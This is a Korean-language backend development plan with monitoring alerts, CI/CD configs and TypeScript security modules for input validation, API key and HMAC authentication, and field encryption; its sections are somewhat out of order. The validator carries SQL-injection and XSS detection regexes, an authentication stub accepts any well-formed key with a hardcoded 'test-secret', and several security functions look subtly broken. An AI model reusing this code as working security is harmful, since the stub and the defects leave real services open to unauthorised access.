    title: 'High Memory Usage Detected',
    message: `Memory usage is at ${usage}%. Consider scaling or optimizing memory usage.`,
    metadata: { memoryUsage: usage }
  }),
  
  agentFailure: (agentName: string, error: string) => ({
    level: 'critical' as const,
    type: 'agent',
    title: `Agent Failure: ${agentName}`,
    message: `Agent ${agentName} has failed with error: ${error}`,
    metadata: { agentName, error }
  }),
  
  projectCreationFailure: (projectId: string, error: string) => ({
    level: 'warning' as const,
    type: 'project',
    title: 'Project Creation Failed',
    message: `Failed to create project ${projectId}: ${error}`,
    metadata: { projectId, error }
  })
};
```

**🔧 사용자 작업**:
- 모니터링 대시보드 URL 접속 확인
- Prometheus 메트릭 수집 확인: http://localhost:8000/metrics
- Jaeger UI 접속 확인: http://localhost:16686
- 알림 채널 환경 변수 설정 (Slack, Email 등)

---

## 📋 Phase 0 완료 체크리스트

### ✅ 완료된 작업
- [x] 개발 환경 초기 설정 (Task 0.1)
- [x] AWS 리소스 초기 설정 (Task 0.2)
- [x] 프로젝트 의존성 설치 (Task 0.3)
- [x] 보안 및 인증 기초 설정 (Task 0.4)
- [x] 테스트 환경 구축 (Task 0.5)
- [x] 로컬 개발 인프라 구성 (Task 0.6)
- [x] CI/CD 파이프라인 기초 설정 (Task 0.7)
- [x] 문서화 시스템 구축 (Task 0.8)
- [x] 모니터링 및 로깅 시스템 구축 (Task 0.9)

### 🎯 Phase 1 준비 완료

Phase 0의 모든 작업이 완료되었습니다. 이제 Phase 1: 코어 인프라 구축을 시작할 준비가 되었습니다.

**다음 단계**: Phase 1 문서 작성 및 구현 시작
```dockerfile
# backend/Dockerfile
FROM node:18-alpine AS builder

WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

COPY . .
RUN npm run build

FROM node:18-alpine
RUN apk add --no-cache dumb-init
RUN addgroup -g 1001 -S nodejs && adduser -S nodejs -u 1001

WORKDIR /app
COPY --from=builder --chown=nodejs:nodejs /app/node_modules ./node_modules
COPY --from=builder --chown=nodejs:nodejs /app/dist ./dist
COPY --from=builder --chown=nodejs:nodejs /app/package.json ./

USER nodejs
EXPOSE 8000

HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD node healthcheck.js || exit 1

ENTRYPOINT ["dumb-init", "--"]
CMD ["node", "dist/main.js"]
```

**🔧 사용자 작업**:
- GitHub 저장소에 secrets 설정 (SNYK_TOKEN, NPM_TOKEN)
- Docker registry 권한 설정
- 브랜치 보호 규칙 설정
### SubTask 0.7.4: 테스트 자동화 파이프라인 설정
**목표**: PR 및 머지 시 자동 테스트 실행 설정

**구현 내용**:
```yaml
# .github/workflows/test-automation.yml
name: Automated Testing Pipeline

on:
  pull_request:
    types: [opened, synchronize, reopened]
  push:
    branches: [main, develop]

jobs:
  test-matrix:
    name: Test Suite - ${{ matrix.test-suite }}
    runs-on: ubuntu-latest
    
    strategy:
      matrix:
        test-suite: [unit, integration, e2e]
        node-version: [18.x, 20.x]
    
    services:
      dynamodb:
        image: amazon/dynamodb-local
        ports:
          - 8000:8000
      redis:
        image: redis:7-alpine
        ports:
          - 6379:6379
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js ${{ matrix.node-version }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'
      
      - name: Install dependencies
        run: |
          cd backend
          npm ci
      
      - name: Run ${{ matrix.test-suite }} tests
        run: |
          cd backend
          npm run test:${{ matrix.test-suite }} -- --coverage
        timeout-minutes: 30
        env:
          NODE_ENV: test
          DYNAMODB_ENDPOINT: http://localhost:8000
          REDIS_HOST: localhost
      
      - name: Upload coverage reports
        if: matrix.node-version == '18.x'
        uses: actions/upload-artifact@v3
        with:
          name: coverage-${{ matrix.test-suite }}
          path: backend/coverage/
```

### SubTask 0.7.5: 의존성 업데이트 자동화
**목표**: 보안 취약점 및 의존성 업데이트 자동화

**구현 내용**:
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/backend"
    schedule:
      interval: "daily"
    open-pull-requests-limit: 5
    groups:
      aws-sdk:
        patterns:
          - "@aws-sdk/*"
      development:
        patterns:
          - "@types/*"
          - "eslint*"
          - "prettier*"
          - "jest*"
    
  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
    
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

**🔧 사용자 작업**:
- GitHub 저장소에 secrets 설정 (SNYK_TOKEN, NPM_TOKEN)
- Docker registry 권한 설정
- 브랜치 보호 규칙 설정
- Dependabot 활성화

## Task 0.10: 보안 강화 설정

### SubTask 0.10.1: 입력 검증 및 살균 시스템
**목표**: 모든 사용자 입력에 대한 철저한 검증

**구현 내용**:
```typescript
// backend/src/security/input-validation.ts
import Joi from 'joi';
import DOMPurify from 'isomorphic-dompurify';
import { Request, Response, NextFunction } from 'express';

// 커스텀 Joi 확장
const customJoi = Joi.extend((joi) => ({
  type: 'string',
  base: joi.string(),
  messages: {
    'string.noSQL': '{{#label}} contains potential SQL injection',
    'string.noXSS': '{{#label}} contains potential XSS attack'
  },
  rules: {
    noSQL: {
      validate(value, helpers) {
        const sqlPatterns = [
          /(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER|CREATE)\b)/i,
          /(--|\/\*|\*\/|xp_|sp_)/i,
          /(\bOR\b\s*\d+\s*=\s*\d+)/i,
          /(\bAND\b\s*\d+\s*=\s*\d+)/i
        ];
        
        for (const pattern of sqlPatterns) {
          if (pattern.test(value)) {
            return helpers.error('string.noSQL');
          }
        }
        return value;
      }
    },
    noXSS: {
      validate(value, helpers) {
        const xssPatterns = [
          /<script[^>]*>.*?<\/script>/gi,
          /<iframe[^>]*>.*?<\/iframe>/gi,
          /javascript:/gi,
          /on\w+\s*=/gi
        ];
        
        for (const pattern of xssPatterns) {
          if (pattern.test(value)) {
            return helpers.error('string.noXSS');
          }
        }
        return value;
      }
    }
  }
}));

// 검증 스키마 정의
export const validationSchemas = {
  // 프로젝트 생성
  createProject: customJoi.object({
    name: customJoi.string()
      .min(3)
      .max(100)
      .pattern(/^[a-zA-Z0-9-_\s]+$/)
      .noSQL()
      .noXSS()
      .required()
      .messages({
        'string.pattern.base': 'Project name can only contain letters, numbers, spaces, hyphens, and underscores'
      }),
    
    description: customJoi.string()
      .min(10)
      .max(5000)
      .noSQL()
      .noXSS()
      .required(),
    
    projectType: customJoi.string()
      .valid('web', 'api', 'mobile', 'desktop', 'cli')
      .required(),
    
    targetPlatforms: customJoi.array()
      .items(customJoi.string().valid('web', 'ios', 'android', 'windows', 'macos', 'linux'))
      .min(1)
      .max(6)
      .unique(),
    
    preferences: customJoi.object({
      framework: customJoi.string().valid('react', 'vue', 'angular', 'svelte', 'nextjs', 'nuxt'),
      language: customJoi.string().valid('javascript', 'typescript', 'python', 'java', 'go'),
      database: customJoi.string().valid('postgres', 'mysql', 'mongodb', 'dynamodb', 'redis')
    })
  }),
  
  // 사용자 등록
  registerUser: customJoi.object({
    email: customJoi.string()
      .email({ tlds: { allow: false } })
      .max(255)
      .noSQL()
      .required(),
    
    password: customJoi.string()
      .min(8)
      .max(128)
      .pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]/)
      .required()
      .messages({
        'string.pattern.base': 'Password must contain at least one uppercase letter, one lowercase letter, one number, and one special character'
      }),
    
    name: customJoi.string()
      .min(2)
      .max(100)
      .pattern(/^[a-zA-Z\s'-]+$/)
      .noSQL()
      .noXSS()
      .required()
  }),
  
  // 에이전트 실행 파라미터
  executeAgent: customJoi.object({
    agentName: customJoi.string()
      .valid(...['nl-input', 'ui-selection', 'parsing', 'component-decision', 'matching-rate', 'search', 'generation', 'assembly', 'download'])
      .required(),
    
    parameters: customJoi.object().pattern(
      customJoi.string(),
      customJoi.alternatives().try(
        customJoi.string().max(1000).noSQL().noXSS(),
        customJoi.number(),
        customJoi.boolean(),
        customJoi.array().max(100)
      )
    )
  })
};

// HTML 살균 옵션
const sanitizeOptions = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'target', 'rel'],
  ALLOW_DATA_ATTR: false,
  RETURN_DOM: false,
  RETURN_DOM_FRAGMENT: false
};

// 입력 살균 함수
export function sanitizeInput(input: any): any {
  if (typeof input === 'string') {
    // HTML 태그 제거 및 살균
    return DOMPurify.sanitize(input, sanitizeOptions);
  } else if (Array.isArray(input)) {
    return input.map(item => sanitizeInput(item));
  } else if (input !== null && typeof input === 'object') {
    const sanitized: any = {};
    for (const key in input) {
      if (input.hasOwnProperty(key)) {
        sanitized[key] = sanitizeInput(input[key]);
      }
    }
    return sanitized;
  }
  return input;
}

// 검증 미들웨어 팩토리
export function validate(schema: Joi.ObjectSchema) {
  return async (req: Request, res: Response, next: NextFunction) => {
    try {
      // 요청 본문 살균
      req.body = sanitizeInput(req.body);
      
      // Joi 검증
      const validated = await schema.validateAsync(req.body, {
        abortEarly: false,
        stripUnknown: true
      });
      
      // 검증된 데이터로 교체
      req.body = validated;
      
      next();
    } catch (error) {
      if (error instanceof Joi.ValidationError) {
        const errors = error.details.map(detail => ({
          field: detail.path.join('.'),
          message: detail.message
        }));
        
        return res.status(400).json({
          error: 'Validation failed',
          details: errors
        });
      }
      
      next(error);
    }
  };
}

// 파일 업로드 검증
export function validateFileUpload(options: {
  maxSize?: number;
  allowedTypes?: string[];
  allowedExtensions?: string[];
}) {
  const {
    maxSize = 10 * 1024 * 1024, // 10MB
    allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'],
    allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.pdf']
  } = options;
  
  return (req: Request, res: Response, next: NextFunction) => {
    if (!req.file) {
      return next();
    }
    
    // 파일 크기 검증
    if (req.file.size > maxSize) {
      return res.status(400).json({
        error: 'File too large',
        maxSize: `${maxSize / 1024 / 1024}MB`
      });
    }
    
    // MIME 타입 검증
    if (!allowedTypes.includes(req.file.mimetype)) {
      return res.status(400).json({
        error: 'Invalid file type',
        allowedTypes
      });
    }
    
    // 확장자 검증
    const extension = path.extname(req.file.originalname).toLowerCase();
    if (!allowedExtensions.includes(extension)) {
      return res.status(400).json({
        error: 'Invalid file extension',
        allowedExtensions
      });
    }
    
    // 파일 내용 검증 (Magic Number)
    const magicNumbers: Record<string, string[]> = {
      'image/jpeg': ['FFD8FF'],
      'image/png': ['89504E47'],
      'image/gif': ['47494638'],
      'application/pdf': ['25504446']
    };
    
    const buffer = req.file.buffer;
    const magic = buffer.toString('hex', 0, 4).toUpperCase();
    const expectedMagic = magicNumbers[req.file.mimetype];
    
    if (expectedMagic && !expectedMagic.some(m => magic.startsWith(m))) {
      return res.status(400).json({
        error: 'File content does not match declared type'
      });
    }
    
    next();
  };
}

// SQL Injection 방지를 위한 파라미터화된 쿼리 헬퍼
export class SafeQueryBuilder {
  private params: any[] = [];
  private query: string = '';
  
  select(table: string, columns: string[] = ['*']): this {
    const safeTable = table.replace(/[^a-zA-Z0-9_]/g, '');
    const safeColumns = columns.map(col => col.replace(/[^a-zA-Z0-9_*]/g, ''));
    this.query = `SELECT ${safeColumns.join(', ')} FROM ${safeTable}`;
    return this;
  }
  
  where(column: string, operator: string, value: any): this {
    const safeColumn = column.replace(/[^a-zA-Z0-9_]/g, '');
    const safeOperator = ['=', '!=', '<', '>', '<=', '>=', 'LIKE'].includes(operator) ? operator : '=';
    
    if (this.query.includes('WHERE')) {
      this.query += ` AND ${safeColumn} ${safeOperator} ?`;
    } else {
      this.query += ` WHERE ${safeColumn} ${safeOperator} ?`;
    }
    
    this.params.push(value);
    return this;
  }
  
  build(): { query: string; params: any[] } {
    return {
      query: this.query,
      params: this.params
    };
  }
}
```
---

### SubTask 0.10.2: API 보안 강화
**목표**: API 엔드포인트 보안 계층 구현

**구현 내용**:
```typescript
// backend/src/security/api-security.ts
import crypto from 'crypto';
import { Request, Response, NextFunction } from 'express';
import { RateLimiter } from '../middleware/rate-limiter';
import jwt from 'jsonwebtoken';

// API 키 관리
export class APIKeyManager {
  private static readonly KEY_PREFIX = 'sk_';
  private static readonly KEY_LENGTH = 32;
  
  static generateAPIKey(): string {
    const randomBytes = crypto.randomBytes(this.KEY_LENGTH);
    const key = randomBytes.toString('base64url');
    return `${this.KEY_PREFIX}${key}`;
  }
  
  static hashAPIKey(apiKey: string): string {
    return crypto
      .createHash('sha256')
      .update(apiKey)
      .digest('hex');
  }
  
  static validateKeyFormat(apiKey: string): boolean {
    const regex = new RegExp(`^${this.KEY_PREFIX}[A-Za-z0-9_-]{${this.KEY_LENGTH * 4/3}}$`);
    return regex.test(apiKey);
  }
}

// HMAC 서명 검증
export class HMACValidator {
  private static readonly ALGORITHM = 'sha256';
  private static readonly TIMESTAMP_TOLERANCE = 300; // 5분
  
  static generateSignature(
    secret: string,
    method: string,
    path: string,
    timestamp: number,
    body?: any
  ): string {
    const payload = [
      method.toUpperCase(),
      path,
      timestamp,
      body ? JSON.stringify(body) : ''
    ].join('\n');
    
    return crypto
      .createHmac(this.ALGORITHM, secret)
      .update(payload)
      .digest('hex');
  }
  
  static validateRequest(req: Request, secret: string): boolean {
    const signature = req.headers['x-signature'] as string;
    const timestamp = parseInt(req.headers['x-timestamp'] as string);
    
    if (!signature || !timestamp) {
      return false;
    }
    
    // 타임스탬프 유효성 검사
    const now = Math.floor(Date.now() / 1000);
    if (Math.abs(now - timestamp) > this.TIMESTAMP_TOLERANCE) {
      return false;
    }
    
    // 서명 생성 및 비교
    const expectedSignature = this.generateSignature(
      secret,
      req.method,
      req.path,
      timestamp,
      req.body
    );
    
    // 타이밍 공격 방지를 위한 안전한 비교
    return crypto.timingSafeEqual(
      Buffer.from(signature),
      Buffer.from(expectedSignature)
    );
  }
}

// OAuth2 스코프 관리
export class ScopeManager {
  static readonly SCOPES = {
    'projects:read': 'Read project information',
    'projects:write': 'Create and modify projects',
    'projects:delete': 'Delete projects',
    'agents:execute': 'Execute agents',
    'agents:monitor': 'Monitor agent execution',
    'components:read': 'Read component library',
    'components:write': 'Add components to library',
    'billing:read': 'View billing information',
    'billing:write': 'Modify billing settings',
    'admin:all': 'Full administrative access'
  };
  
  static validateScopes(requiredScopes: string[], userScopes: string[]): boolean {
    // admin:all 스코프는 모든 권한 포함
    if (userScopes.includes('admin:all')) {
      return true;
    }
    
    return requiredScopes.every(scope => userScopes.includes(scope));
  }
  
  static parseScopes(scopeString: string): string[] {
    return scopeString.split(' ').filter(scope => scope in this.SCOPES);
  }
}

// API 보안 미들웨어
export class APISecurityMiddleware {
  // API 키 인증
  static apiKeyAuth(requiredScopes: string[] = []) {
    return async (req: Request, res: Response, next: NextFunction) => {
      const apiKey = req.headers['x-api-key'] as string;
      
      if (!apiKey) {
        return res.status(401).json({
          error: 'API key required',
          code: 'MISSING_API_KEY'
        });
      }
      
      if (!APIKeyManager.validateKeyFormat(apiKey)) {
        return res.status(401).json({
          error: 'Invalid API key format',
          code: 'INVALID_API_KEY_FORMAT'
        });
      }
      
      try {
        // DB에서 API 키 정보 조회
        const hashedKey = APIKeyManager.hashAPIKey(apiKey);
        const keyInfo = await this.getAPIKeyInfo(hashedKey);
        
        if (!keyInfo || !keyInfo.active) {
          return res.status(401).json({
            error: 'Invalid or inactive API key',
            code: 'INVALID_API_KEY'
          });
        }
        
        // 스코프 검증
        if (requiredScopes.length > 0) {
          const hasRequiredScopes = ScopeManager.validateScopes(
            requiredScopes,
            keyInfo.scopes
          );
          
          if (!hasRequiredScopes) {
            return res.status(403).json({
              error: 'Insufficient permissions',
              code: 'INSUFFICIENT_SCOPES',
              required: requiredScopes,
              provided: keyInfo.scopes
            });
          }
        }
        
        // 요청에 사용자 정보 추가
        req.user = {
          id: keyInfo.userId,
          scopes: keyInfo.scopes,
          authMethod: 'api_key'
        };
        
        // 사용량 기록
        await this.recordAPIKeyUsage(hashedKey, req.path);
        
        next();
      } catch (error) {
        console.error('API key validation error:', error);
        return res.status(500).json({
          error: 'Authentication error',
          code: 'AUTH_ERROR'
        });
      }
    };
  }
  
  // HMAC 서명 검증
  static hmacAuth() {
    return async (req: Request, res: Response, next: NextFunction) => {
      const apiKey = req.headers['x-api-key'] as string;
      
      if (!apiKey) {
        return res.status(401).json({
          error: 'API key required for HMAC authentication',
          code: 'MISSING_API_KEY'
        });
      }
      
      try {
        // API 키에서 시크릿 조회
        const hashedKey = APIKeyManager.hashAPIKey(apiKey);
        const keyInfo = await this.getAPIKeyInfo(hashedKey);
        
        if (!keyInfo || !keyInfo.secret) {
          return res.status(401).json({
            error: 'Invalid API key',
            code: 'INVALID_API_KEY'
          });
        }
        
        // HMAC 검증
        const isValid = HMACValidator.validateRequest(req, keyInfo.secret);
        
        if (!isValid) {
          return res.status(401).json({
            error: 'Invalid signature',
            code: 'INVALID_SIGNATURE'
          });
        }
        
        req.user = {
          id: keyInfo.userId,
          scopes: keyInfo.scopes,
          authMethod: 'hmac'
        };
        
        next();
      } catch (error) {
        console.error('HMAC validation error:', error);
        return res.status(500).json({
          error: 'Authentication error',
          code: 'AUTH_ERROR'
        });
      }
    };
  }
  
  // IP 화이트리스트
  static ipWhitelist(allowedIPs: string[] = []) {
    return (req: Request, res: Response, next: NextFunction) => {
      // 개발 환경에서는 건너뛰기
      if (process.env.NODE_ENV === 'development') {
        return next();
      }
      
      const clientIP = req.ip || req.socket.remoteAddress || '';
      
      // IPv6 localhost를 IPv4로 변환
      const normalizedIP = clientIP === '::1' ? '127.0.0.1' : clientIP;
      
      if (!allowedIPs.includes(normalizedIP)) {
        return res.status(403).json({
          error: 'Access denied from this IP address',
          code: 'IP_NOT_ALLOWED'
        });
      }
      
      next();
    };
  }
  
  // 요청 크기 제한
  static requestSizeLimit(maxSizeBytes: number = 10 * 1024 * 1024) {
    return (req: Request, res: Response, next: NextFunction) => {
      let size = 0;
      
      req.on('data', (chunk) => {
        size += chunk.length;
        
        if (size > maxSizeBytes) {
          res.status(413).json({
            error: 'Request entity too large',
            code: 'PAYLOAD_TOO_LARGE',
            maxSize: maxSizeBytes
          });
          req.destroy();
        }
      });
      
      next();
    };
  }
  
  // 보안 헤더 설정
  static securityHeaders() {
    return (req: Request, res: Response, next: NextFunction) => {
      // CORS 프리플라이트 요청 처리
      if (req.method === 'OPTIONS') {
        res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH');
        res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-API-Key, X-Signature, X-Timestamp');
        res.header('Access-Control-Max-Age', '86400');
        return res.sendStatus(204);
      }
      
      // 보안 헤더 설정
      res.setHeader('X-Content-Type-Options', 'nosniff');
      res.setHeader('X-Frame-Options', 'DENY');
      res.setHeader('X-XSS-Protection', '1; mode=block');
      res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
      res.setHeader('Content-Security-Policy', "default-src 'self'");
      res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
      res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
      
      // API 버전 헤더
      res.setHeader('X-API-Version', process.env.API_VERSION || '1.0.0');
      
      next();
    };
  }
  
  // Helper 메서드들
  private static async getAPIKeyInfo(hashedKey: string): Promise<any> {
    // 실제 구현에서는 DynamoDB에서 조회
    // 임시 구현
    return {
      userId: 'user123',
      scopes: ['projects:read', 'projects:write'],
      active: true,
      secret: 'test-secret'
    };
  }
  
  private static async recordAPIKeyUsage(hashedKey: string, endpoint: string): Promise<void> {
    // 실제 구현에서는 사용량 기록
    // CloudWatch 메트릭 기록 등
  }
}

// 동적 Rate Limiting
export class DynamicRateLimiter {
  private static limits: Map<string, number> = new Map([
    ['free', 100],      // 100 requests per hour
    ['basic', 1000],    // 1000 requests per hour
    ['pro', 10000],     // 10000 requests per hour
    ['enterprise', -1]  // Unlimited
  ]);
  
  static middleware() {
    return async (req: Request, res: Response, next: NextFunction) => {
      if (!req.user) {
        return next();
      }
      
      // 사용자 플랜 조회
      const userPlan = await this.getUserPlan(req.user.id);
      const limit = this.limits.get(userPlan) || 100;
      
      // 무제한 플랜
      if (limit === -1) {
        return next();
      }
      
      // Rate limiting 적용
      const rateLimiter = new RateLimiter();
      const limitMiddleware = rateLimiter.middleware({
        windowMs: 60 * 60 * 1000, // 1시간
        max: limit,
        keyGenerator: (req) => req.user!.id,
        message: `Rate limit exceeded. Your plan allows ${limit} requests per hour.`
      });
      
      limitMiddleware(req, res, next);
    };
  }
  
  private static async getUserPlan(userId: string): Promise<string> {
    // 실제 구현에서는 DB에서 조회
    return 'basic';
  }
}
```

### SubTask 0.10.3: 데이터 암호화 및 보호
**목표**: 저장 및 전송 중인 데이터 암호화

**구현 내용**:
```typescript
// backend/src/security/encryption.ts
import crypto from 'crypto';
import { KMSClient, EncryptCommand, DecryptCommand, GenerateDataKeyCommand } from '@aws-sdk/client-kms';

// 암호화 설정
const ENCRYPTION_ALGORITHM = 'aes-256-gcm';
const IV_LENGTH = 16;
const TAG_LENGTH = 16;
const SALT_LENGTH = 32;
const KEY_LENGTH = 32;
const ITERATIONS = 100000;

export class EncryptionService {
  private kmsClient: KMSClient;
  private masterKeyId: string;
  
  constructor() {
    this.kmsClient = new KMSClient({ region: process.env.AWS_REGION });
    this.masterKeyId = process.env.KMS_MASTER_KEY_ID!;
  }
  
  // 필드 레벨 암호화
  async encryptField(plaintext: string, context?: Record<string, string>): Promise<string> {
    // KMS로 데이터 키 생성
    const dataKeyResponse = await this.kmsClient.send(new GenerateDataKeyCommand({
      KeyId: this.masterKeyId,
      KeySpec: 'AES_256',
      EncryptionContext: context
    }));
    
    const plaintextKey = dataKeyResponse.Plaintext!;
    const encryptedKey = dataKeyResponse.CiphertextBlob!;
    
    // AES-GCM으로 데이터 암호화
    const iv = crypto.randomBytes(IV_LENGTH);
    const cipher = crypto.createCipheriv(ENCRYPTION_ALGORITHM, plaintextKey, iv);
    
    const encrypted = Buffer.concat([
      cipher.update(plaintext, 'utf8'),
      cipher.final()
    ]);
    
    const tag = cipher.getAuthTag();
    
    // 암호화된 키 + IV + 태그 + 암호문을 하나로 결합
    const combined = Buffer.concat([
      Buffer.from([encryptedKey.length >> 8, encryptedKey.length & 0xff]),
      encryptedKey,
      iv,
      tag,
      encrypted
    ]);
    
    // 메모리 정리
    crypto.randomFillSync(plaintextKey);
    
    return combined.toString('base64');
  }
  
  // 필드 복호화
  async decryptField(encryptedData: string, context?: Record<string, string>): Promise<string> {
    const combined = Buffer.from(encryptedData, 'base64');
    
    // 구성 요소 분리
    const keyLength = (combined[0] << 8) | combined[1];
    const encryptedKey = combined.slice(2, 2 + keyLength);
    const iv = combined.slice(2 + keyLength, 2 + keyLength + IV_LENGTH);
    const tag = combined.slice(2 + keyLength + IV_LENGTH, 2 + keyLength + IV_LENGTH + TAG_LENGTH);
    const encrypted = combined.slice(2 + keyLength + IV_LENGTH + TAG_LENGTH);
    
    // KMS로 데이터 키 복호화
    const decryptResponse = await this.kmsClient.send(new DecryptCommand({
      CiphertextBlob: encryptedKey,
      EncryptionContext: context
    }));
    
    const plaintextKey = decryptResponse.Plaintext!;
    
    // AES-GCM으로 데이터 복호화
    const decipher = crypto.createDecipheriv(ENCRYPTION_ALGORITHM, plaintextKey, iv);
    decipher.setAuthTag(tag);
    
    const decrypted = Buffer.concat([
      decipher.update(encrypted),
      decipher.final()
    ]);
    
    // 메모리 정리
    crypto.randomFillSync(plaintextKey);
    
    return decrypted.toString('utf8');
  }
  
  // 대칭 암호화 (로컬 키 사용)
  encryptSymmetric(plaintext: string, password: string): string {
    const salt = crypto.randomBytes(SALT_LENGTH);
    const key = crypto.pbkdf2Sync(password, salt, ITERATIONS, KEY_LENGTH, 'sha256');
    const iv = crypto.randomBytes(IV_LENGTH);
    
    const cipher = crypto.createCipheriv(ENCRYPTION_ALGORITHM, key, iv);
    const encrypted = Buffer.concat([
      cipher.update(plaintext, 'utf8'),
      cipher.final()
    ]);
    
    const tag = cipher.getAuthTag();
    
    // salt + iv + tag + encrypted
    const combined = Buffer.concat([salt, iv, tag, encrypted]);
    
    return combined.toString('base64');
  }
  
  // 대칭 복호화
  decryptSymmetric(encryptedData: string, password: string): string {
    const combined = Buffer.from(encryptedData, 'base64');
    
    const salt = combined.slice(0, SALT_LENGTH);
    const iv = combined.slice(SALT_LENGTH, SALT_LENGTH + IV_LENGTH);
    const tag = combined.slice(SALT_LENGTH + IV_LENGTH, SALT_LENGTH + IV_LENGTH + TAG_LENGTH);
    const encrypted = combined.slice(SALT_LENGTH + IV_LENGTH + TAG_LENGTH);
    
    const key = crypto.pbkdf2Sync(password, salt, ITERATIONS, KEY_LENGTH, 'sha256');
    
    const decipher = crypto.createDecipheriv(ENCRYPTION_ALGORITHM, key, iv);
    decipher.setAuthTag(tag);
    
    const decrypted = Buffer.concat([
      decipher.update(encrypted),
      decipher.final()
    ]);
    
    return decrypted.toString('utf8');
  }
  
  // 해시 생성 (비가역)
  hash(data: string): string {
    return crypto
      .createHash('sha256')
      .update(data)
      .digest('hex');
  }
  
  // 안전한 토큰 생성
  generateSecureToken(length: number = 32): string {
    return crypto.randomBytes(length).toString('base64url');
  }
}

// PII 데이터 마스킹
export class DataMasking {
  // 이메일 마스킹
  static maskEmail(email: string): string {
    const [local, domain] = email.split('@');
    if (!domain) return '***';
    
    const maskedLocal = local.length > 2 
      ? local[0] + '*'.repeat(local.length - 2) + local[local.length - 1]
      : '*'.repeat(local.length);
    
    return `${maskedLocal}@${domain}`;
  }
  
  // 전화번호 마스킹
  static maskPhone(phone: string): string {
    const digits = phone.replace(/\D/g, '');
    if (digits.length < 4) return '*'.repeat(digits.length);
    
    return digits.slice(0, -4).replace(/./g, '*') + digits.slice(-4);
  }
  
  // 신용카드 마스킹
  static maskCreditCard(cardNumber: string): string {
    const digits = cardNumber.replace(/\D/g, '');
    if (digits.length < 4) return '*'.repeat(digits.length);
    
    return '*'.repeat(digits.length - 4) + digits.slice(-4);
  }
  
  // 주민번호/SSN 마스킹
  static maskSSN(ssn: string): string {
    const digits = ssn.replace(/\D/g, '');
    if (digits.length < 4) return '*'.repeat(digits.length);
    
    return '*'.repeat(digits.length - 4) + digits.slice(-4);
  }
  
  // JSON 객체 내 민감 필드 마스킹
  static maskObject(obj: any, sensitiveFields: string[]): any {
    const masked = JSON.parse(JSON.stringify(obj));
    
    const maskField = (target: any, path: string) => {
      const keys = path.split('.');
      let current = target;
      
      for (let i = 0; i < keys.length - 1; i++) {
        if (current[keys[i]] === undefined) return;
        current = current[keys[i]];
      }
      
      const lastKey = keys[keys.length - 1];
      if (current[lastKey] !== undefined) {
        if (typeof current[lastKey] === 'string') {
          // 필드 타입에 따른 마스킹
          if (lastKey.toLowerCase().includes('email')) {
            current[lastKey] = this.maskEmail(current[lastKey]);
          } else if (lastKey.toLowerCase().includes('phone')) {
            current[lastKey] = this.maskPhone(current[lastKey]);
          } else if (lastKey.toLowerCase().includes('card')) {
            current[lastKey] = this.maskCreditCard(current[lastKey]);
          } else if (lastKey.toLowerCase().includes('ssn')) {
            current[lastKey] = this.maskSSN(current[lastKey]);
          } else {
            // 일반 텍스트 마스킹
            current[lastKey] = '*'.repeat(current[lastKey].length);
          }
        }
      }
    };
    
    sensitiveFields.forEach(field => maskField(masked, field));
    
    return masked;
  }
}

// 암호화 미들웨어
export class EncryptionMiddleware {
  private static encryptionService = new EncryptionService();
  
  // 응답 데이터 암호화
  static encryptResponse(fieldsToEncrypt: string[]) {
    return async (req: Request, res: Response, next: NextFunction) => {
      const originalJson = res.json;
      
      res.json = async function(data: any) {
        if (fieldsToEncrypt.length > 0 && data) {
          const encrypted = await EncryptionMiddleware.encryptFields(
            data,
            fieldsToEncrypt,
            { userId: req.user?.id }
          );
          return originalJson.call(this, encrypted);
        }
        return originalJson.call(this, data);
      };
      
      next();
    };
  }
  
  // 요청 데이터 복호화
  static decryptRequest(fieldsToDecrypt: string[]) {
    return async (req: Request, res: Response, next: NextFunction) => {
      if (fieldsToDecrypt.length > 0 && req.body) {
        try {
          req.body = await EncryptionMiddleware.decryptFields(
            req.body,
            fieldsToDecrypt,
            { userId: req.user?.id }
          );
        } catch (error) {
          return res.status(400).json({
            error: 'Failed to decrypt request data',
            code: 'DECRYPTION_ERROR'
          });
        }
      }
      next();
    };
  }
  
  private static async encryptFields(
    data: any,
    fields: string[],
    context?: Record<string, string>
  ): Promise<any> {
    const result = JSON.parse(JSON.stringify(data));
    
    for (const field of fields) {
      const value = this.getFieldValue(result, field);
      if (value && typeof value === 'string') {
        const encrypted = await this.encryptionService.encryptField(value, context);
        this.setFieldValue(result, field, encrypted);
      }
    }
    
    return result;
  }
  
  private static async decryptFields(
    data: any,
    fields: string[],
    context?: Record<string, string>
  ): Promise<any> {
    const result = JSON.parse(JSON.stringify(data));
    
    for (const field of fields) {
      const value = this.getFieldValue(result, field);
      if (value && typeof value === 'string') {
        const decrypted = await this.encryptionService.decryptField(value, context);
        this.setFieldValue(result, field, decrypted);
      }
    }
    
    return result;
  }
  
  private static getFieldValue(obj: any, path: string): any {
    const keys = path.split('.');
    let current = obj;
    
    for (const key of keys) {
      if (current[key] === undefined) return undefined;
      current = current[key];
    }
    
    return current;
  }
  
  private static setFieldValue(obj: any, path: string, value: any): void {
    const keys = path.split('.');
    let current = obj;
    
    for (let i = 0; i < keys.length - 1; i++) {
      if (current[keys[i]] === undefined) {
        current[keys[i]] = {};
      }
      current = current[keys[i]];
    }
    
    current[keys[keys.length - 1]] = value;
  }
}
```

### SubTask 0.10.4: 보안 감사 로깅
**목표**: 모든 보안 이벤트 추적 및 감사

